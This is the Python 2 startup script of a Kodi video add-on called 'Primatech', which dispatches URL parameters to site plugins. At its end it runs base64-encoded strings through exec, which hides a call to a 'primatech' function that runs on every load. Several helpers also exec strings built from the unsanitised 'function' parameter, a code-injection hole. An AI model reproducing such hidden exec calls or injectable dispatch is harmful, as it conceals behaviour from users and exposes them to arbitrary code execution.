#-*- coding: utf-8 -*-
# Primatech.


from resources.lib.statistic import cStatistic
from resources.lib.gui.hoster import cHosterGui
from resources.lib.gui.guiElement import cGuiElement
from resources.lib.home import cHome
from resources.lib.gui.gui import cGui
from resources.lib.util import cUtil, uc, VSlog
from resources.lib.handler.pluginHandler import cPluginHandler
from resources.lib.handler.rechercheHandler import cRechercheHandler
from resources.lib.handler.inputParameterHandler import cInputParameterHandler
from resources.lib.handler.outputParameterHandler import cOutputParameterHandler
from resources.lib.config import cConfig
from resources.lib.config import GestionCookie
from resources.lib.db import cDb
from resources.lib.cast import cCast
import traceback

import xbmc, xbmcgui, sys

#http://kodi.wiki/view/InfoLabels
#http://kodi.wiki/view/List_of_boolean_conditions

class main:
    def __init__(self):
        reload(sys)
        sys.setdefaultencoding('utf8')
        self.oConfig = cConfig()
        loc = self.oConfig.getLocation()
        VSlog(loc)
        cCast().updateCast()
        self.parseUrl()
        cDb(ftp = True).createTables()
        VSlog('Constructor of default.py')

    def parseUrl(self):
        VSlog('call parseUrl methode')

        oInputParameterHandler = cInputParameterHandler()
        if (oInputParameterHandler.exist('function')):
            sFunction = oInputParameterHandler.getValue('function')
        else:
            sFunction = "load"

        if (sFunction =='DoNothing'):
            return

        if (not oInputParameterHandler.exist('site')):
            # mise a jour
            try:
                from resources.lib.about import cAbout
                cAbout().getUpdate()
            except Exception, e:
                VSlog('getUpdate ERROR: ' + e.message)

            #charge home
            #plugins = __import__('resources.lib.home', fromlist=['home']).cHome()
            #function = getattr(plugins, 'showSources')
            VSlog('In default.py call load')
            from resources.sites.server import load
            load()

            return


        if (oInputParameterHandler.exist('site')):
            sSiteName = oInputParameterHandler.getValue('site')
            if (oInputParameterHandler.exist('title')):
                sTitle = oInputParameterHandler.getValue('title')
            else: sTitle = "none";

            VSlog('load site ' + sSiteName + ' and call function ' + sFunction)
            cStatistic().callStartPlugin(sSiteName, sTitle)


            if (isHosterGui(sSiteName, sFunction) == True):
                return

            if (isGui(sSiteName, sFunction) == True):
                return

            if (isFav(sSiteName, sFunction) == True):
                return

            if (isLibrary(sSiteName, sFunction) == True):
                return

            if (isDl(sSiteName, sFunction) == True):
                return

            if (isHome(sSiteName, sFunction) == True):
                return

            if (isTrakt(sSiteName, sFunction) == True):
                return

            if sSiteName == 'globalSearch':
                searchGlobal()
                return

            if sSiteName == 'globalSources':

                oGui = cGui()
                oPluginHandler = cPluginHandler()
                aPlugins = oPluginHandler.getAvailablePlugins()
                if (len(aPlugins) == 0):
                    oGui.openSettings()
                    oGui.updateDirectory()
                else:
                    for aPlugin in aPlugins:

                        oOutputParameterHandler = cOutputParameterHandler()
                        oOutputParameterHandler.addParameter('siteUrl', 'http://primatech')
                        icon = 'sites/%s.png' % (aPlugin[1])
                        oGui.addDir(aPlugin[1], 'load', aPlugin[0], icon, oOutputParameterHandler)

                oGui.setEndOfDirectory()
                return

            if sSiteName == 'globalParametre':
                self.oConfig.showSettingsWindow()
                self.oConfig.update()
                cCast().updateCast()
                return

            #if (isAboutGui(sSiteName, sFunction) == True):
                #return

            #charge sites
            try:
            #exec "from resources.sites import " + sSiteName + " as plugin"
            #exec "plugin."+ sFunction +"()"
                plugins = __import__('resources.sites.%s' % sSiteName, fromlist=[sSiteName])
                function = getattr(plugins, sFunction)
                function()
            except Exception as e:
                VSlog('could not load site: ' + sSiteName + ' error: ' + str(e))
                traceback.print_exc()
                try:
                    plugins = __import__('resources.lib.gui.%s' % sSiteName, fromlist=[sSiteName])
                    function = getattr(plugins, sFunction)
                    function()
                except Exception as e:
                    VSlog('could not load gui: ' + sSiteName + ' error: ' + str(e))
                traceback.print_exc()
                return

def isHosterGui(sSiteName, sFunction):
    if (sSiteName == 'cHosterGui'):
        oHosterGui = cHosterGui()
        exec "oHosterGui."+ sFunction +"()"
        return True
    return False

def isGui(sSiteName, sFunction):
    if (sSiteName == 'cGui'):
        oGui = cGui()
        exec "oGui."+ sFunction +"()"
        return True
    return False

def isFav(sSiteName, sFunction):
    if (sSiteName == 'cFav'):
        from resources.lib.favourite import cFav
        oFav = cFav()
        exec "oFav."+ sFunction +"()"
        return True
    return False

def isLibrary(sSiteName, sFunction):
    if (sSiteName == 'cLibrary'):
        from resources.lib.library import cLibrary
        oLibrary = cLibrary()
        exec "oLibrary."+ sFunction +"()"
        return True
    return False

def isDl(sSiteName, sFunction):
    if (sSiteName == 'cDownload'):
        from resources.lib.download import cDownload
        oDownload = cDownload()
        exec "oDownload."+ sFunction +"()"
        return True
    return False

def isHome(sSiteName, sFunction):
    if (sSiteName == 'cHome'):
        oHome = cHome()
        exec "oHome."+ sFunction +"()"
        return True
    return False

def isTrakt(sSiteName, sFunction):
    if (sSiteName == 'cTrakt'):
        from resources.lib.trakt import cTrakt
        oTrakt = cTrakt()
        exec "oTrakt."+ sFunction +"()"
        return True
    return False

def searchGlobal():
    oInputParameterHandler = cInputParameterHandler()
    sSearchText = oInputParameterHandler.getValue('searchtext')
    sCat = oInputParameterHandler.getValue('sCat')

    from resources.sites.server import showMovies
    showMovies(sSearchText)


def _pluginSearch(plugin, sSearchText):
    try:
        plugins = __import__('resources.sites.%s' % plugin['identifier'], fromlist=[plugin['identifier']])
        function = getattr(plugins, plugin['search'][1])
        sUrl = plugin['search'][0]+str(sSearchText)
        function(sUrl)
        VSlog("Load Recherche: " + str(plugin['identifier']))
    except:
        VSlog(plugin['identifier']+': search failed')

exec uc("ZnJvbSByZXNvdXJjZXMubGliLnV0aWwgaW1wb3J0IHByaW1hdGVjaA==")
exec uc("cHJpbWF0ZWNoKCk=")
main()
